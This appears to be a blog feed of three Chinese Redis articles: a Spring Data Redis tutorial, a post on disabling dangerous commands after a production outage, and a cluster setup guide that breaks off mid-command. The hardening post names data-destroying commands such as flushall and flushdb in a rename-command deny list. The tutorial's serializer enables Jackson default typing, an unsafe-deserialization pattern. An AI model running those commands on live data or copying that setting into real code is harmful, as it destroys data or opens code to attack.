    
    <entry>
      <title>Spring Data Redis 详解及实战一文搞定</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Spring%20Data%20Redis%20%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%AE%9E%E6%88%98%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9A/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Spring%20Data%20Redis%20%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%AE%9E%E6%88%98%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>SDR - Spring Data Redis的简称。</p><p>Spring Data Redis提供了从Spring应用程序轻松配置和访问Redis的功能。它提供了与商店互动的低级别和高级别抽象，使用户免受基础设施问题的困扰。</p><h3 id="Spring-Boot-实战"><a href="#Spring-Boot-实战" class="headerlink" title="Spring Boot 实战"></a>Spring Boot 实战</h3><h4 id="引用依赖"><a href="#引用依赖" class="headerlink" title="引用依赖"></a>引用依赖</h4><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;&#x2F;artifactId&gt;    &lt;version&gt;$&#123;spring-boot.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="添加redis配置类"><a href="#添加redis配置类" class="headerlink" title="添加redis配置类"></a>添加redis配置类</h4><pre class="line-numbers language-none"><code class="language-none">@EnableCaching@Configurationpublic class RedisConfig extends CachingConfigurerSupport &#123;@Beanpublic KeyGenerator keyGenerator() &#123;return (Object target, Method method, Object... params) -&gt; &#123;StringBuilder sb &#x3D; new StringBuilder();sb.append(target.getClass().getName());sb.append(method.getName());for (Object obj : params) &#123;sb.append(obj.toString());&#125;return sb.toString();&#125;;&#125;@Beanpublic CacheManager cacheManager(RedisTemplate redisTemplate) &#123;RedisCacheManager cacheManager &#x3D; new RedisCacheManager(redisTemplate);cacheManager.setDefaultExpiration(10000);return cacheManager;&#125;@Beanpublic RedisTemplate&lt;String, String&gt; redisTemplate(RedisConnectionFactory factory) &#123;StringRedisTemplate template &#x3D; new StringRedisTemplate(factory);template.setValueSerializer(getSerializer(template));template.afterPropertiesSet();return template;&#125;private RedisSerializer getSerializer(StringRedisTemplate template) &#123;ObjectMapper om &#x3D; new ObjectMapper();om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);Jackson2JsonRedisSerializer serializer &#x3D; new Jackson2JsonRedisSerializer(Object.class);serializer.setObjectMapper(om);return serializer;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="添加redis配置参数："><a href="#添加redis配置参数：" class="headerlink" title="添加redis配置参数："></a>添加redis配置参数：</h4><pre class="line-numbers language-none"><code class="language-none">spring.redis:  database: 0 # Redis数据库索引（默认为0）  host: 192.168.1.168  port: 6379  #password: 123456  timeout: 0 # 连接超时时间（毫秒）  pool:     max-active: 8 # 连接池最大连接数（使用负值表示没有限制）    max-idle: 8 # 连接池中的最大空闲连接    max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制）    min-idle: 0 # 连接池中的最小空闲连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h4><pre class="line-numbers language-none"><code class="language-none">@Autowiredprivate RedisTemplate redisTemplate;...redisTemplate.opsForValue().set(&quot;test&quot;, System.currentTimeMillis());...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="通过-RedisTemplate-处理对象"><a href="#通过-RedisTemplate-处理对象" class="headerlink" title="通过 RedisTemplate 处理对象"></a>通过 RedisTemplate 处理对象</h3><p>大多数用户可能会使用RedisTemplate它的相应软件包org.springframework.data.redis.core-由于其丰富的功能集，模板实际上是Redis模块的中心类。该模板提供了Redis交互的高级抽象。虽然RedisConnection提供接受和返回二进制值（byte数组）的低级别方法，但模板负责序列化和连接管理，使用户无需处理这些细节。</p><p>此外，该模板提供了操作视图，它提供丰富的，通用的接口，用于针对特定类型或某些键（通过KeyBound接口）进行操作，如下所述：</p><h5 id="键类型操作："><a href="#键类型操作：" class="headerlink" title="键类型操作："></a>键类型操作：</h5><table><thead><tr><th>接口</th><th>描述</th></tr></thead><tbody><tr><td>GeoOperations</td><td>Redis的地理空间操作，如GEOADD，GEORADIUS..</td></tr><tr><td>HashOperations</td><td>Redis散列类型操作</td></tr><tr><td>HyperLogLogOperations</td><td>Redis的HyperLogLog操作，如PFADD，PFCOUNT..</td></tr><tr><td>ListOperations</td><td>Redis列表操作</td></tr><tr><td>SetOperations</td><td>Redis集合操作</td></tr><tr><td>ValueOperations</td><td>Redis字符串操作</td></tr><tr><td>ZSetOperations</td><td>Redis有序集合操作</td></tr></tbody></table><h5 id="键绑定操作："><a href="#键绑定操作：" class="headerlink" title="键绑定操作："></a>键绑定操作：</h5><table><thead><tr><th>接口</th><th>描述</th></tr></thead><tbody><tr><td>BoundGeoOperations</td><td>Redis的地理空间操作</td></tr><tr><td>BoundHashOperations</td><td>Redis散列类型键绑定操作</td></tr><tr><td>BoundKeyOperations</td><td>Redis键绑定操作</td></tr><tr><td>BoundListOperations</td><td>Redis列表键绑定操作</td></tr><tr><td>BoundSetOperations</td><td>Redis集合键绑定操作</td></tr><tr><td>BoundValueOperations</td><td>Redis字符串键绑定操作</td></tr><tr><td>BoundZSetOperations</td><td>Redis有序集合键绑定操作</td></tr></tbody></table><h5 id="怎么使用？"><a href="#怎么使用？" class="headerlink" title="怎么使用？"></a>怎么使用？</h5><p>Spring Boot实战Redis章节配置完成后，使用Spring直接注入即可。</p><pre class="line-numbers language-none"><code class="language-none">public class Example &#123;  @Autowired  private RedisTemplate&lt;String, String&gt; template;  @Resource(name&#x3D;&quot;redisTemplate&quot;)  private ListOperations&lt;String, String&gt; listOps;  public void addLink(String userId, URL url) &#123;    listOps.leftPush(userId, url.toExternalForm());  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RedisTemplate是线程安全的，开箱即用，可以在多个实例中重复使用。</p><h5 id="RedisTemplate和StringRedisTemplate区别？"><a href="#RedisTemplate和StringRedisTemplate区别？" class="headerlink" title="RedisTemplate和StringRedisTemplate区别？"></a>RedisTemplate和StringRedisTemplate区别？</h5><blockquote><p>org.springframework.data.redis.core.RedisTemplate</p><p>org.springframework.data.redis.core.StringRedisTemplate</p></blockquote><p>1、StringRedisTemplate继承自RedisTemplate</p><p>2、StringRedisTemplate默认使用String序列化方式，RedisTemplate默认使用jdk自带的序列化方式。</p><p>3、两者数据不互通，只能各自管理各自处理过的数据。</p><p>推荐使用StringRedisTemplate。</p><h5 id="直接与Redis对话"><a href="#直接与Redis对话" class="headerlink" title="直接与Redis对话"></a>直接与Redis对话</h5><p>直接底层的与Redis对话，没有封装。默认配置只能一个数据库，如下，可以直接通过获取StringRedisConnection来切换当前操作的数据库。</p><pre class="line-numbers language-none"><code class="language-none">stringRedisTemplate.execute((RedisCallback&lt;Boolean&gt;) connection -&gt; &#123;StringRedisConnection stringRedisConnection &#x3D; (StringRedisConnection) connection;stringRedisConnection.select(5);stringRedisConnection.set(&quot;name&quot;, &quot;zoe&quot;);return true;&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="序列化器"><a href="#序列化器" class="headerlink" title="序列化器"></a>序列化器</h3><p>从Spring Data Redis框架本身的角度看，存放到redis的数据只是字节，虽然Redis本身支持各种类型，但大部分是指数据存储的方式，而不是它所代表的内容，由用户决定是否将字节转换为字符串或其他对象。</p><p>用户自定义类型和原始数据之间的转换由org.springframework.data.redis.serializer包中的序列化器进行处理。</p><p>这个包下面主要包含了两种类型的序列化器：</p><ul><li>基于<code>RedisSerializer</code>的双向串行器。</li><li>元素的读写使用的RedisElementReader和RedisElementWriter。</li></ul><p>它们的主要区别是，RedisSerializer序列化成byte[]，而后者使用的是ByteBuffer。</p><h4 id="序列化器实现类"><a href="#序列化器实现类" class="headerlink" title="序列化器实现类"></a>序列化器实现类</h4><p>这里有几种开箱即用的实现，其中有两种在之前的文章已经涉及过。</p><table><thead><tr><th>实现</th><th>描述</th></tr></thead><tbody><tr><td>StringRedisSerializer</td><td>String&#x2F;byte[]转换，速度快</td></tr><tr><td>JdkSerializationRedisSerializer</td><td>JDK自带序列化</td></tr><tr><td>OxmSerializer</td><td>XML序列化，占空间，速度慢</td></tr><tr><td>Jackson2JsonRedisSerializer</td><td>JSON序列化，需要定义JavaType</td></tr><tr><td>GenericJackson2JsonRedisSerializer</td><td>JSON序列化，无需定义JavaType</td></tr></tbody></table><p>所以，如果只是简单的字符串类型，使用StringRedisSerializer就可以了，如果要有对象就使用Json的序列化吧，可以很方便的组装成对象。</p><h3 id="事务支持"><a href="#事务支持" class="headerlink" title="事务支持"></a>事务支持</h3><p>Spring Data Redis提供了对Redis的事务支持，如：multi, exec, discard命令。</p><p>Spring Data Redis提供了SessionCallback接口，在同一个连接中需要执行多个操作时使用，与使用Redis事务时一样。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre class="line-numbers language-none"><code class="language-none">@Testpublic void testTransaction() &#123;List&lt;Object&gt; txResults &#x3D; (List&lt;Object&gt;) stringRedisTemplate.execute(new SessionCallback&lt;List&lt;Object&gt;&gt;() &#123;public List&lt;Object&gt; execute(RedisOperations operations)throws DataAccessException &#123;operations.multi();operations.opsForSet().add(&quot;t1&quot;, &quot;value1&quot;);operations.opsForSet().add(&quot;t2&quot;, &quot;value2&quot;);operations.opsForSet().add(&quot;t3&quot;, &quot;value3&quot;);return operations.exec();&#125;&#125;);txResults.forEach(e -&gt; logger.info(&quot;txResults: &quot; + e));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码，是一个接受字符串值的模板，RedisTemplate会使用相应的序列化器，如果把value3换成非字符串333，那第3条会报错，前面两个也不会保存成功。</p><p>当然，exec方法也可以接受自定义的序列化器</p><pre class="line-numbers language-none"><code class="language-none">List&lt;Object&gt; exec(RedisSerializer&lt;?&gt; valueSerializer);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Transactional注解支持"><a href="#Transactional注解支持" class="headerlink" title="@Transactional注解支持"></a>@Transactional注解支持</h2><p>注解事务支持在默认情况下是禁用的，必须通过把RedisTemplate设置明确开启事务支持：setEnableTransactionSupport(true)，如果没有错误即成功，有错误就全部回滚。当前连接所有写操作都会进入操作队列，读操作会转移到一个新的连接。</p><h4 id="示例配置"><a href="#示例配置" class="headerlink" title="示例配置"></a>示例配置</h4><pre class="line-numbers language-none"><code class="language-none">@Configurationpublic class RedisTxContextConfiguration &#123;  @Bean  public StringRedisTemplate redisTemplate() &#123;    StringRedisTemplate template &#x3D; new StringRedisTemplate(redisConnectionFactory());    &#x2F;&#x2F; explicitly enable transaction support    template.setEnableTransactionSupport(true);    return template;  &#125;  @Bean  public PlatformTransactionManager transactionManager() throws SQLException &#123;    return new DataSourceTransactionManager(dataSource());  &#125;  @Bean  public RedisConnectionFactory redisConnectionFactory( &#x2F;&#x2F; jedis || lettuce);  @Bean  public DataSource dataSource() throws SQLException &#123; &#x2F;&#x2F; ... &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="使用约束"><a href="#使用约束" class="headerlink" title="使用约束"></a>使用约束</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 绑定到当前线程上的连接template.opsForValue().set(&quot;foo&quot;, &quot;bar&quot;);&#x2F;&#x2F; 读操作不参与事务connection template.keys(&quot;*&quot;);&#x2F;&#x2F; 当在事务中设置的值不可见时返回nulltemplate.opsForValue().get(&quot;foo&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个致命的 Redis 命令，导致公司损失 400 万！！</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/%E4%B8%80%E4%B8%AA%E8%87%B4%E5%91%BD%E7%9A%84%20Redis%20%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%AF%BC%E8%87%B4%E5%85%AC%E5%8F%B8%E6%8D%9F%E5%A4%B1%20400%20%E4%B8%87%EF%BC%81%EF%BC%81/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/%E4%B8%80%E4%B8%AA%E8%87%B4%E5%91%BD%E7%9A%84%20Redis%20%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%AF%BC%E8%87%B4%E5%85%AC%E5%8F%B8%E6%8D%9F%E5%A4%B1%20400%20%E4%B8%87%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近安全事故濒发啊，前几天发生了《<a href="https://mp.weixin.qq.com/s/51ti1Tn4OcD5ZKYYFG91dg">顺丰高级运维工程师的删库事件</a>》，今天又看到了 PHP 工程师在线执行了 Redis 危险命令导致某公司损失 400 万。。</p><p>什么样的 Redis 命令会有如此威力，造成如此大的损失？</p><p>具体消息如下：</p><blockquote><p>据云头条报道，某公司技术部发生 2 起本年度 PO 级特大事故，造成公司资金损失 400 万，原因如下：</p><p>由于 PHP 工程师直接操作上线 redis，执行 keys * wxdb（此处省略）cf8* 这样的命令，导致redis锁住，导致 CPU 飙升，引起所有支付链路卡住，等十几秒结束后，所有的请求流量全部挤压到了 rds 数据库中，使数据库产生了雪崩效应，发生了数据库宕机事件。</p><p>该公司表示，如再犯类似事故，将直接开除，并表示之后会逐步收回运维部各项权限。</p></blockquote><p>看完这个消息后，我心又一惊，为什么这么低级的问题还在犯？为什么线上的危险命令没有被禁用？这事件报道出来真是觉得很低级。。。</p><p>且不说是哪家公司，发生这样的事故，不管是大公司还是小公司，我觉得都不应该，相关负责人应该引咎辞职！！！</p><p>对 Redis 稍微有点使用经验的人都知道线上是不能执行 <code>keys *</code> 相关命令的，虽然其模糊匹配功能使用非常方便也很强大，在小数据量情况下使用没什么问题，数据量大会导致 Redis 锁住及 CPU 飙升，在生产环境建议禁用或者重命名！</p><h4 id="还有哪些危险命令？"><a href="#还有哪些危险命令？" class="headerlink" title="还有哪些危险命令？"></a>还有哪些危险命令？</h4><p>Redis 的危险命令主要有以下几个：</p><ul><li><strong>keys</strong></li></ul><p>客户端可查询出所有存在的键。</p><ul><li><strong>flushdb</strong></li></ul><blockquote><p>Delete all the keys of the currently selected DB. This command never fails.</p></blockquote><p>删除 Redis 中当前所在数据库中的所有记录，并且此命令从不会执行失败。</p><ul><li><strong>flushall</strong></li></ul><blockquote><p>Delete all the keys of all the existing databases, not just the currently selected one. This command never fails.</p></blockquote><p>删除 Redis 中所有数据库中的所有记录，不只是当前所在数据库，并且此命令从不会执行失败。</p><ul><li><strong>config</strong></li></ul><p>客户端可修改 Redis 配置。</p><h4 id="怎么禁用或重命名危险命令？"><a href="#怎么禁用或重命名危险命令？" class="headerlink" title="怎么禁用或重命名危险命令？"></a>怎么禁用或重命名危险命令？</h4><p>看下 <code>redis.conf</code> 默认配置文件，找到 <code>SECURITY</code> 区域，如以下所示。</p><pre class="line-numbers language-none"><code class="language-none">################################## SECURITY #################################### Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other# commands.  This might be useful in environments in which you do not trust# others with access to the host running redis-server.## This should stay commented out for backward compatibility and because most# people do not need auth (e.g. they run their own servers).## Warning: since Redis is pretty fast an outside user can try up to# 150k passwords per second against a good box. This means that you should# use a very strong password otherwise it will be very easy to break.## requirepass foobared# Command renaming.## It is possible to change the name of dangerous commands in a shared# environment. For instance the CONFIG command may be renamed into something# hard to guess so that it will still be available for internal-use tools# but not available for general clients.## Example:## rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52## It is also possible to completely kill a command by renaming it into# an empty string:## rename-command CONFIG &quot;&quot;## Please note that changing the name of commands that are logged into the# AOF file or transmitted to slaves may cause problems.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看说明，添加 <code>rename-command</code> 配置即可达到安全目的。</p><p><strong>1）禁用命令</strong></p><pre class="line-numbers language-none"><code class="language-none">rename-command KEYS     &quot;&quot;rename-command FLUSHALL &quot;&quot;rename-command FLUSHDB  &quot;&quot;rename-command CONFIG   &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2）重命名命令</strong></p><pre class="line-numbers language-none"><code class="language-none">rename-command KEYS     &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;rename-command FLUSHALL &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;rename-command FLUSHDB  &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;rename-command CONFIG   &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的 XX 可以定义新命令名称，或者用随机字符代替。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超详细的 Redis Cluster 官方集群搭建指南</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84%20Redis%20Cluster%20%E5%AE%98%E6%96%B9%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84%20Redis%20Cluster%20%E5%AE%98%E6%96%B9%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>今天从 0 开始搭建 Redis Cluster 官方集群，解决搭建过程中遇到的问题，超详细。</p><h4 id="安装ruby环境"><a href="#安装ruby环境" class="headerlink" title="安装ruby环境"></a>安装ruby环境</h4><p>因为官方提供的创建集群的工具是用ruby写的，需要ruby2.2.2+版本支持，ruby安装需要指定openssl。</p><p><strong>安装openssl</strong></p><pre class="line-numbers language-none"><code class="language-none">$ wget https:&#x2F;&#x2F;www.openssl.org&#x2F;source&#x2F;openssl-1.0.2m.tar.gz$ tar -zxvf openssl-1.0.2m.tar.gz$ cd openssl-1.0.2m$ .&#x2F;config --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl$ .&#x2F;config -t$ make$ make install$ openssl version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>安装ruby</strong></p><pre class="line-numbers language-none"><code class="language-none">$ yum remove ruby$ wget https:&#x2F;&#x2F;cache.ruby-lang.org&#x2F;pub&#x2F;ruby&#x2F;2.4&#x2F;ruby-2.4.2.tar.gz$ tar -zxvf ruby-2.4.2.tar.gz$ cd ruby-2.4.2$ .&#x2F;configure --with-openssl-dir&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl$ make$ make install$ sudo ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ruby &#x2F;usr&#x2F;bin&#x2F;ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>安装rubygems</strong></p><pre class="line-numbers language-none"><code class="language-none">$ wget https:&#x2F;&#x2F;rubygems.org&#x2F;rubygems&#x2F;rubygems-2.3.0.tgz$ tar -zxvf rubygems-2.3.0.tgz$ cd rubygems-2.3.0$ ruby setup.rb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>安装zlib</strong></p><pre class="line-numbers language-none"><code class="language-none">$ vi &#x2F;ruby-2.4.2&#x2F;ext&#x2F;zlib&#x2F;Makefile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">zlib.o: $(top_srcdir)&#x2F;include&#x2F;ruby.h修改为：zlib.o: ..&#x2F;..&#x2F;include&#x2F;ruby.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ yum install zlib*$ cd &#x2F;ruby-2.4.2&#x2F;ext&#x2F;zlib$ ruby extconf.rb$ make$ make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="安装redis库"><a href="#安装redis库" class="headerlink" title="安装redis库"></a>安装redis库</h4><pre class="line-numbers language-none"><code class="language-none">$ gem install redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ERROR:  While executing gem ... (Gem::Exception)    Unable to require openssl, install OpenSSL and rebuild ruby (preferred) or use non-HTTPS sources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>报这个错，安装openssl-devel，并重新编译ruby即可。</p><blockquote><p>参考：<a href="https://www.larshaendler.com/2015/05/20/unable-to-require-openssl-install-openssl-and-rebuild-ruby-on-ubuntu-14-lts/">https://www.larshaendler.com/2015/05/20/unable-to-require-openssl-install-openssl-and-rebuild-ruby-on-ubuntu-14-lts/</a></p></blockquote><h4 id="搭建集群"><a href="#搭建集群" class="headerlink" title="搭建集群"></a>搭建集群</h4><p>1、创建集群目录</p><p>首先进入一个新目录，创建六个以端口号为名字的子目录。</p><pre class="line-numbers language-none"><code class="language-none">$ mkdir redis-cluster$ cd redis-cluster$ mkdir 9001 9002 9003 9004 9005 9006<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2、添加集群配置文件</p><p>在文件夹9001~9006中各建一个redis.conf文件，修改对应文件夹的端口，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">port 9001cluster-enabled yescluster-config-file nodes.confcluster-node-timeout 5000appendonly yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>cluster-enabled：用于开实例的集群模式</p></li><li><p>cluster-conf-file：设定了保存节点配置文件的路径，默认值为nodes.conf，节点配置文件无须人为修改，它由 Redis集群在启动时创建， 并在有需要时自动进行更新。</p></li></ul><p>要让集群正常运作至少需要三个主节点，不过在刚开始试用集群功能时， 强烈建议使用六个节点： 其中三个为主节点， 而其余三个则是各个主节点的从节点。</p><p>3、添加redis服务文件</p><p>把编译好的redis-server文件复制到redis-cluster文件夹中。</p><p>4、启动集群实例</p><p>进入到9001~90066每个目录下，启动每个实例：</p><pre class="line-numbers language-none"><code class="language-none">$ cd 9001$ ..&#x2F;redis-server .&#x2F;redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5、创建集群</p><p>现在我们已经有了六个正在运行中的Redis实例，接下来我们需要使用这些实例来创建集群，并为每个节点编写配置文件。通过使用Redis集群命令行工具redis-trib，编写节点配置文件的工作可以非常容易地完成：redis-trib位于Redis源码的src文件夹中，它是一个Ruby程序，这个程序通过向实例发送特殊命令来完成创建新集群，检查集群，或者对集群进行重新分片（reshared）等工作。</p><pre class="line-numbers language-none"><code class="language-none">$ .&#x2F;redis-trib.rb create --replicas 1 127.0.0.1:9001 127.0.0.1:9002 127.0.0.1:9003 127.0.0.1:9004 127.0.0.1:9005 127.0.0.1:9006<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; Creating cluster&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Using 3 masters:127.0.0.1:9001127.0.0.1:9002127.0.0.1:9003Adding replica 127.0.0.1:9004 to 127.0.0.1:9001Adding replica 127.0.0.1:9005 to 127.0.0.1:9002Adding replica 127.0.0.1:9006 to 127.0.0.1:9003M: bd330d41ffcc57a5a5d32e3f738ddf82c48cfed0 127.0.0.1:9001   slots:0-5460 (5461 slots) masterM: 688b8cdbdc38fe6b9e81b410aae2f1c048f5907c 127.0.0.1:9002   slots:5461-10922 (5462 slots) masterM: 33b757db6091e486af2032f1463d1fb07e8e89a7 127.0.0.1:9003   slots:10923-16383 (5461 slots) masterS: b00b464e4deb93a661755923641d36cadf648fcd 127.0.0.1:9004   replicates bd330d41ffcc57a5a5d32e3f738ddf82c48cfed0S: b3ec3a9c125cf168807231a16bacab946974d563 127.0.0.1:9005   replicates 688b8cdbdc38fe6b9e81b410aae2f1c048f5907cS: 06a207f7a4dd3023f88e01fad8635cb471d004eb 127.0.0.1:9006   replicates 33b757db6091e486af2032f1463d1fb07e8e89a7Can I set the above configuration? (type &#39;yes&#39; to accept): yes&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join....&gt;&gt;&gt; Performing Cluster Check (using node 127.0.0.1:9001)M: bd330d41ffcc57a5a5d32e3f738ddf82c48cfed0 127.0.0.1:9001   slots:0-5460 (5461 slots) master   1 additional replica(s)S: 06a207f7a4dd3023f88e01fad8635cb471d004eb 127.0.0.1:9006   slots: (0 slots) slave   replicates 33b757db6091e486af2032f1463d1fb07e8e89a7S: b00b464e4deb93a661755923641d36cadf648fcd 127.0.0.1:9004   slots: (0 slots) slave   replicates bd330d41ffcc57a5a5d32e3f738ddf82c48cfed0M: 688b8cdbdc38fe6b9e81b410aae2f1c048f5907c 127.0.0.1:9002   slots:5461-10922 (5462 slots) master   1 additional replica(s)S: b3ec3a9c125cf168807231a16bacab946974d563 127.0.0.1:9005   slots: (0 slots) slave   replicates 688b8cdbdc38fe6b9e81b410aae2f1c048f5907cM: 33b757db6091e486af2032f1463d1fb07e8e89a7 127.0.0.1:9003   slots:10923-16383 (5461 slots) master   1 additional replica(s)[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这表示集群中的 16384 个槽都有至少一个主节点在处理， 集群运作正常。</p><p>6、查看集群节点</p><pre class="line-numbers language-none"><code class="language-none">192.168.10.38:9001&gt; cluster nodesbd330d41ffcc57a5a5d32e3f738ddf82c48cfed0 127.0.0.1:9001@19001 myself,master - 0 1511774435000 1 connected 0-546006a207f7a4dd3023f88e01fad8635cb471d004eb 127.0.0.1:9006@19006 slave 33b757db6091e486af2032f1463d1fb07e8e89a7 0 1511774436000 6 connectedb00b464e4deb93a661755923641d36cadf648fcd 127.0.0.1:9004@19004 slave bd330d41ffcc57a5a5d32e3f738ddf82c48cfed0 0 1511774436557 4 connected688b8cdbdc38fe6b9e81b410aae2f1c048f5907c 127.0.0.1:9002@19002 master - 0 1511774436557 2 connected 5461-10922b3ec3a9c125cf168807231a16bacab946974d563 127.0.0.1:9005@19005 slave 688b8cdbdc38fe6b9e81b410aae2f1c048f5907c 0 1511774436657 5 connected33b757db6091e486af2032f1463d1fb07e8e89a7 127.0.0.1:9003@19003 master - 0 1511774436000 3 connected 10923-16383<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="连接使用集群"><a href="#连接使用集群" class="headerlink" title="连接使用集群"></a>连接使用集群</h4><pre class="line-numbers language-none"><code class="language-none">$ .&#x2F;redis-cli -c -h 192.168.1.8 -p 9002 -a 123456<span aria-hidden="true" 